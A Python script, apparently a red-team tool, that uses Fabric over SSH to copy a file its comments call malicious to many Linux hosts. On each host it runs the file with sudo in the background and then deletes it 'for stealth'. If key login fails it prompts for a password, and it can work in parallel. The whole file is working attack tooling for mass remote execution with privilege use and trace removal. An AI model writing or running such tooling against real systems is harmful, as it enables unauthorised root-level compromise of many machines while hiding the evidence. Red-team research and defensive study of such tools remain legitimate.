#!/usr/bin/env python3
"""
Red Team Orchestrator - Deploys and executes malicious script on remote targets
Requires: pip install fabric
"""

from fabric import Connection, SerialGroup, Config
from fabric.exceptions import GroupException
import sys
import os
import time
from datetime import datetime
from utils import LINUX_TARGET_IPS


# ===== CONFIGURATION =====

# SSH Configuration
SSH_USER = None  # Username will be provided at runtime
# SSH key path not hardcoded; Fabric/SSH will use agent or prompt as needed

# File paths
LOCAL_SCRIPT_PATH = "internal/timer_noise.py"  # Your local malicious Python file
REMOTE_SCRIPT_PATH = "/tmp/timer_noise.py"  # Where to place it on target

# Optional: Use password instead of key (less secure)
# SSH_PASSWORD = "your_password"

# ===== DEPLOYMENT FUNCTIONS =====

def create_connection(host, user, password=None):
    """Create an SSH connection to a target host.

    If password is provided, pass it to Fabric so password auth can be attempted.
    Otherwise rely on SSH agent / keys / OS prompt.
    """
    try:
        if password:
            conn = Connection(host=host, user=user, connect_kwargs={"password": password}, connect_timeout=10)
        else:
            # Let Fabric/Paramiko try agent/keys; user may be None to use local username
            if user:
                conn = Connection(host=host, user=user, connect_timeout=10)
            else:
                conn = Connection(host=host, connect_timeout=10)
        return conn
    except Exception as e:
        print(f"[!] Failed to connect to {host}: {e}")
        return None

def copy_script(conn, host):
    """Copy the malicious script to the target system"""
    try:
        # Check if local script exists
        if not os.path.exists(LOCAL_SCRIPT_PATH):
            print(f"[!] Local script not found: {LOCAL_SCRIPT_PATH}")
            return False
        
        # Upload the file
        print(f"[*] Copying script to {host}:{REMOTE_SCRIPT_PATH}")
        conn.put(LOCAL_SCRIPT_PATH, REMOTE_SCRIPT_PATH)
        
        # Make it executable
        conn.run(f"chmod +x {REMOTE_SCRIPT_PATH}")
        
        print(f"[+] Successfully copied script to {host}")
        return True
    except Exception as e:
        print(f"[!] Failed to copy script to {host}: {e}")
        return False

def run_script_with_sudo(conn, host):
    """Execute the script with sudo privileges on the target (backgrounded)"""
    try:
        print(f"[*] Executing {REMOTE_SCRIPT_PATH} with sudo on {host}")

        # Run in background using nohup so the process continues after the SSH session ends.
        # Using pty=False avoids allocating a TTY which can interfere with backgrounding.
        cmd = f"nohup python3 {REMOTE_SCRIPT_PATH} >/dev/null 2>&1 &"
        conn.sudo(cmd, pty=False)

        print(f"[+] Execution started on {host} (backgrounded)")
        return True
    except Exception as e:
        print(f"[!] Failed to execute script on {host}: {e}")
        return False

def cleanup(conn, host):
    """Remove the script after execution (for stealth). Uses sudo to ensure removal when needed."""
    try:
        print(f"[*] Cleaning up {REMOTE_SCRIPT_PATH} on {host}")
        conn.sudo(f"rm -f {REMOTE_SCRIPT_PATH}", pty=False)
        print(f"[+] Cleanup completed on {host}")
        return True
    except Exception as e:
        print(f"[!] Cleanup failed on {host}: {e}")
        return False

def deploy_to_single_host(host, user):
    """Deploy and execute on a single target host"""
    print(f"\n{'='*50}")
    print(f"[>] Processing target: {host}")
    print(f"{'='*50}")

    def attempt_with_conn(conn):
        try:
            # Step 1: Copy the script
            if not copy_script(conn, host):
                return False

            # Step 2: Run with sudo
            if not run_script_with_sudo(conn, host):
                return False

            # Step 3: Cleanup - remove the script from the target for stealth
            cleanup(conn, host)
            return True
        except Exception as e:
            print(f"[!] Error during deployment to {host}: {e}")
            return False

    # First attempt: rely on SSH agent / keys
    conn = create_connection(host, user)
    if conn:
        try:
            ok = attempt_with_conn(conn)
            if ok:
                return True
        finally:
            try:
                conn.close()
            except Exception:
                pass

    # If we reach here, initial attempt failed (likely auth). Prompt once for password and retry.
    try:
        pw = input(f"[?] Enter SSH password for {user or 'user'}@{host} (leave blank to skip): ")
    except EOFError:
        pw = ""
    pw = pw.strip()
    if not pw:
        print(f"[!] No password provided; skipping {host}")
        return False

    conn = create_connection(host, user, pw)
    if not conn:
        print(f"[!] Could not authenticate to {host} with provided password; skipping")
        return False

    try:
        return attempt_with_conn(conn)
    finally:
        try:
            conn.close()
        except Exception:
            pass

def deploy_parallel(targets, user, max_workers=5):
    """Deploy to multiple targets in parallel"""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    print(f"\n{'#'*60}")
    print(f"# Starting parallel deployment to {len(targets)} targets")
    print(f"# Using {max_workers} parallel workers")
    print(f"{'#'*60}\n")
    
    results = {}
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all deployment tasks
        future_to_host = {executor.submit(deploy_to_single_host, host, user): host for host in targets}
        
        # Collect results as they complete
        for future in as_completed(future_to_host):
            host = future_to_host[future]
            try:
                success = future.result()
                results[host] = success
                status = "✓ SUCCESS" if success else "✗ FAILED"
                print(f"\n[>] {host}: {status}")
            except Exception as e:
                results[host] = False
                print(f"\n[!] {host}: EXCEPTION - {e}")
    
    elapsed_time = time.time() - start_time
    
    # Print summary
    print(f"\n{'='*60}")
    print(f"DEPLOYMENT SUMMARY")
    print(f"{'='*60}")
    successful = sum(1 for success in results.values() if success)
    failed = len(results) - successful
    print(f"Total targets: {len(results)}")
    print(f"Successful: {successful}")
    print(f"Failed: {failed}")
    print(f"Time elapsed: {elapsed_time:.2f} seconds")
    print(f"{'='*60}")
    
    return results

# ===== MAIN EXECUTION =====

def main():
    """Main orchestrator function"""
    print(r"""
    ╔══════════════════════════════════════╗
    ║   Red Team Remote Orchestrator       ║
    ║   Fabric-based Deployment Tool       ║
    ╚══════════════════════════════════════╝
    """)
    
    # Verify local script exists
    if not os.path.exists(LOCAL_SCRIPT_PATH):
        print(f"[!] ERROR: Local script '{LOCAL_SCRIPT_PATH}' not found!")
        print(f"[*] Current directory: {os.getcwd()}")
        sys.exit(1)
    
    username = input("SSH username (press Enter to use current/agent): ").strip()
    if not username:
        username = None
    print(f"[*] Local script: {LOCAL_SCRIPT_PATH}")
    print(f"[*] Remote path: {REMOTE_SCRIPT_PATH}")
    print(f"[*] Target count: {len(LINUX_TARGET_IPS)}")
    print(f"[*] SSH user: {username if username else '(default/agent)'}")
    print()
    
    # Ask for confirmation
    response = input("Proceed with deployment? (y/N): ")
    if response.lower() != 'y':
        print("[!] Deployment cancelled")
        sys.exit(0)
    
    # Choose deployment mode
    print("\nDeployment modes:")
    print("  1. Sequential (one host at a time)")
    print("  2. Parallel (multiple hosts simultaneously)")
    mode = input("Choose mode (1/2): ").strip()
    
    if mode == "2":
        max_workers = input("Max parallel workers (default 5): ").strip()
        max_workers = int(max_workers) if max_workers else 5
        results = deploy_parallel(LINUX_TARGET_IPS, username, max_workers)
    else:
        results = {}
        for host in LINUX_TARGET_IPS:
            results[host] = deploy_to_single_host(host, username)
    
    # Exit with appropriate code
    if all(results.values()):
        print("\n[+] All targets deployed successfully!")
        sys.exit(0)
    else:
        print("\n[!] Some deployments failed. Check logs above.")
        sys.exit(1)

if __name__ == "__main__":
    main()